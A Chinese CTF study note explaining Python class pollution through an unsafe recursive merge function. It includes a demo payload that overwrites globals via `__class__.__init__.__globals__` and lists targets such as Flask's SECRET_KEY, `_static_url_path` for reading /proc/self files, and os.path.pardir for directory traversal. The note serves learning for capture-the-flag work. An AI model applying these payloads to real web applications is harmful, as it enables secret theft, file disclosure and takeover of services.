tags:: CTFWEB/Python

- # 前置知识点
	- python中每一个函数都有globals dunder，我们可以通过修改对象的globals dunder属性来修改`__file__`等全局变量
		- ```python
		  secret_var = 114
		  
		  def test():
		      pass
		  
		  class a:
		      def __init__(self):
		          pass
		  
		  print(test.__globals__ == globals() == a.__init__.__globals__)
		  ```
	- 题目中以下形式的函数会修改类的属性
		- ```python
		  def merge(src, dst):
		      # Recursive merge function
		      for k, v in src.items():
		          if hasattr(dst, '__getitem__'):
		              if dst.get(k) and type(v) == dict:
		                  merge(v, dst.get(k))
		              else:
		                  dst[k] = v
		          elif hasattr(dst, k) and type(v) == dict:
		              merge(v, getattr(dst, k))
		          else:
		              setattr(dst, k, v)
		  ```
	- `sys`模块的modules属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到所有模块
		- ```python
		  import sys
		  print(sys.modules.keys())
		  ```
	- importlib中的所有文件都引入了sys，且其中定义的loader对象在每一个模块的spec dunder中都可以找到
		- 所以我们可以通过`<模块名>.__spec__.loader.__init__.__globals__`找到sys模块，从而通过sys模块找到所有的模块进行污染
		- ```python
		  fenjing.__spec__.loader.__init__.__globals__["sys"]
		  ```
	- 函数的默认参数都在函数的`__defaults__`和`__kwdefaults__`这两个属性中，可以被污染
	- os.environ可以被污染
	- flask的SECRET_KEY，`_got_first_request`和`_static_url_path`可以被污染
		- `_static_url_path`污染成`/`即可通过类似`/static/proc/self/cmdline`的uri读取
	- `os.path.pardir`（也就是`..`）可以被污染，修改即可在flask渲染文件处实现目录穿越
	- jinja
		- 语法标识符`{{`等可以被污染
			- [参考](https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment)
		- 渲染时拼接的文件头可以被污染
- # 示例
	- ```python
	  def merge(src, dst):
	      # Recursive merge function
	      for k, v in src.items():
	          if hasattr(dst, '__getitem__'):
	              if dst.get(k) and type(v) == dict:
	                  merge(v, dst.get(k))
	              else:
	                  dst[k] = v
	          elif hasattr(dst, k) and type(v) == dict:
	              merge(v, getattr(dst, k))
	          else:
	              setattr(dst, k, v)
	  
	  def f():
	      pass
	  
	  class A:
	      def __init__(self):
	          pass
	      def aaa(self):
	          pass
	  
	  secret = "114514"
	  a = A()
	  
	  # 假设环境有以上所示的函数和对象
	  # 我们就可以通过这个payload修改secret
	  payload = {
	      "__class__": {
	          "__init__": {
	              "__globals__": {
	                  "secret": "1919810"
	              }
	          }
	      }
	  }
	  merge(payload, a)
	  print(secret) # 1919810
	  ```
- > [参考](https://tttang.com/archive/1876/)